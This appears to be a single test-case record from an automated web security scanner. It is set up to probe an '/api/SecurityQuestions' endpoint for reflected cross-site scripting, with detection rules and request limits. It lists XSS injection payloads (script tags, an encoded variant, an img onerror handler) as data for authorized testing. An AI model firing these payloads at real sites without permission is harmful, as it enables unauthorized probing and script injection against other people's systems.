    {
      "id": "tc-hv-001-1",
      "hypothesis_id": "hv-001",
      "base_url": "http://example",
      "method": "GET",
      "endpoint": "/api/SecurityQuestions",
      "parameter": "name",
      "payloads": [
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "<script>alert(1)</script>"
            },
            {
              "location": "query",
              "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
            },
            {
              "location": "query",
              "value": "\"'><img src=x onerror=alert(1)>"
            },
            {
              "location": "query",
              "value": "Score Board<script>console.log(1)</script>"
            }
          ],
          "description": "Reflected XSS probe payloads to detect reflection or encoding",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        }
      ],
      "prerequisites": [],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "in response body within 2000 bytes of known question area the injected payload or HTML-encoded equivalent appears",
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "response body length changes by >=30% compared to baseline when name parameter changed",
          "threshold": {
            "body_length_delta_pct": 30.0
          },
          "weight": 0.5
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 20
      },
      "max_retries": 2,
      "delay_between_requests": 0.5,
      "tags": [
        "xss",
        "reflected",
        "query"
      ],
      "estimated_duration": 60
    },
